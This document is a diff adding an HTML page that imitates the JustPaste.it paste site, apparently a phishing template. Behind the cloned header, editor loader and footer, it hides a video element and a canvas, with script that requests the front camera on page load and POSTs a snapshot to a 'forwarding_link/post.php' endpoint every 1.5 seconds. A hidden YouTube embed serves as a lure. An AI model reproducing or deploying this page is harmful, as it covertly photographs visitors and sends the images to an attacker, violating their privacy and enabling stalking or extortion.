@@ -1,0 +1,216 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+  .frm {
+  display:hidden;
+  
+  }
+  
+  </style>
+  
+  
+   <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="content-language" content="en" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="google-site-verification" content="rUp8isOBygjhxPJ2qyy6QtBi9vWRFhIboMXucJsCtrE" />
+    <title>JustPaste.it - paste text and share with your friends</title>
+    <link rel="preload" href="/static/img/jp_logo_v3.svg" as="image" />
+        
+    <meta name="description" content="The quickest way to share text and images with other people">
+                            <link rel="preload" href="/build/6594.1d776be7.css" as="style" />
+            <link rel="stylesheet" type="text/css"  href="/build/6594.1d776be7.css" />
+                    <link rel="preload" href="/build/global.0a223c6f.css" as="style" />
+            <link rel="stylesheet" type="text/css"  href="/build/global.0a223c6f.css" />
+            
+    <link rel="stylesheet" href="/build/9439.06492843.css">
+    <link rel="stylesheet" href="/build/editarticlestyles.0a68b17b.css">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="icon" type="image/png" sizes="160x160" href="/favicon-160x160.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="/favicon-48x48.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+    <meta name="apple-mobile-web-app-title" content="JustPaste.it">
+    <meta name="application-name" content="JustPaste.it">
+    <meta name="msapplication-TileColor" content="#FFDF5C">
+    <meta name="theme-color" content="#FFDF5C">
+                 <script>
+          window.tabsData = {
+            activeTab: "add",
+          };
+          window.mainPanelOptions = {"logoUrl":"\/static\/img\/jp_logo_v3.svg","addArticleUrl":"\/","loginUrl":"\/login","logoutUrl":"\/logout","favouriteArticlesUrl":"\/account\/favourite","subscribedArticlesUrl":"\/account\/subscribed","sharedArticlesUrl":"\/account\/shared","manageAccountUrl":"\/account\/manage","trashUrl":"\/account\/trash","messagesUrl":"\/account\/messages","articlesStatsUrl":"\/account\/articles-stats","premiumUrl":"\/premium\/subscription","unreadMessagesUrl":"https:\/\/notification.justpaste.it\/api\/v1\/stats\/unread","profileSettings":"\/account\/settings","isLoggedIn":false};
+        </script>
+  </head>
+
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+      <div class="frm">
+        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      </div>
+      
+   
+   
+
+    <body class="d-flex flex-column h-100">
+<!-- Static navbar -->
+    <div class="mainTableTopMiddle">
+        <div class="container" style="max-width: 1315px">
+            <header id="mainPanelButtons" class="d-flex flex-wrap justify-content-md-between">
+                <a href="/" class="d-flex align-items-center col-8 text-decoration-none">
+                    <img src="/static/img/jp_logo_v3.svg" width="160px" height="50px" alt="JustPaste.it" />
+                </a>
+            </header>
+        </div>
+    </div>
+<main class="flex-shrink-0">
+    <div id="headContainer" class="container" style="max-width: 1315px">
+        <div class="row">
+            <div class="col-12">
+                    <div id="editArticleWidget">
+        <div class="loaderParent" style="height: 300px">
+    <div class="aligner-item text-center">
+        <div id="loadingTextDiv">
+            Loading...
+        </div>
+        <div class="spinner-border text-danger" role="status"></div>
+    </div>
+</div>
+<noscript>You need to enable JavaScript</noscript>    </div>
+            </div>
+        </div> <!-- /row -->
+    </div> <!-- /container -->
+</main>
+<footer class="footer mt-auto py-1 bg-light">
+    <div class="container">
+        <div class="row">
+            <div class="col text-muted">
+                &copy; 2022 <span class="hidden-xs">JustPaste.it</span>
+            </div>
+            <div class="col text-muted text-end">
+                <ul class="nav basePageFooterList">
+                    <li class="nav-item d-none d-sm-inline">
+                        <a href="/login">Account</a>
+                    </li>
+                    <li class="nav-item d-none d-sm-inline">
+                        <a href="/terms">Terms</a>
+                    </li>
+                    <li class="nav-item d-none d-sm-inline">
+                        <a href="/privacypolicy">Privacy</a>
+                    </li>
+                    <li class="nav-item d-none d-sm-inline">
+                        <a href="/cookies">Cookies</a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="/u/justpasteit">Blog</a>
+                    </li>
+                    <li class="nav-item">
+                        <a href="/about">About</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</footer>
+            <script src="/build/runtime.42844c74.js" async></script>
+        <script src="/build/1676.a8814dff.js" async></script>
+        <script src="/build/8452.7f25125b.js" async></script>
+        <script src="/build/2752.11754ddd.js" async></script>
+        <script src="/build/mainpanelwidget.02232b23.js" async></script>
+    
+    <script>
+        window.editArticleSettings = {"upgradePremiumUrl":"\/premium\/subscription","newArticleApiUrl":"\/api\/v1\/new-article","saveArticleApiUrl":"\/api\/v1\/save-article","autoSaveArticleApiUrl":"\/api\/v1\/auto-save-article","existingArticleApiUrl":"\/api\/v1\/existing-article","shareUserSuggestUrl":"\/api\/account\/v1\/share-user-suggest","tagSuggestUrl":"\/api\/account\/v1\/tag-suggest","articleCancelChangesApiUrl":"\/api\/v1\/article-cancel-changes","checkPathChangesApiUrl":"\/api\/v1\/check-path","changeLinkSharingSecretUrl":"\/api\/v1\/change-link-sharing-secret","apiArticleChangesUrl":"\/api\/v1\/article-changes","apiArticleChangeContentUrl":"\/api\/v1\/article-changes-content","apiArticleRestoreVersionUrl":"\/api\/v1\/article-changes-restore","articleId":null,"secureCode":null,"premiumUser":null,"isLoggedUser":false,"uploadImagesEndpoint":"\/upload","documentBaseUrl":"https:\/\/justpaste.it","contentCss":"\/build\/editor.59ee42c9.css","captchaSettings":{"createTestUrl":"https:\/\/justpaste.it\/captcha\/create\/article","nextTestUrl":"https:\/\/justpaste.it\/captcha\/next-case\/{testId}","verifyTestCaseUrl":"https:\/\/justpaste.it\/captcha\/test-solution\/{testId}"}};
+    </script>
+                <script>window.editArticleInitPath = '/build/145.5f93a0d6.js';</script>
+                            <script src="/build/145.5f93a0d6.js"></script>
+                    <script src="/build/7685.94028e8e.js"></script>
+                    <script src="/build/9490.9e43a90b.js"></script>
+                    <script src="/build/7508.6d994a46.js"></script>
+                    <script src="/build/1421.1217e7c3.js"></script>
+                    <script src="/build/5936.7f846918.js"></script>
+                    <script src="/build/9439.d3c8dd33.js"></script>
+                    <script src="/build/1012.a375df5f.js"></script>
+                    <script src="/build/7578.150bf9f2.js"></script>
+                    <script src="/build/editArticle.f73003c7.js"></script>
+    
+      
+      
+    </body>
+
+</html>
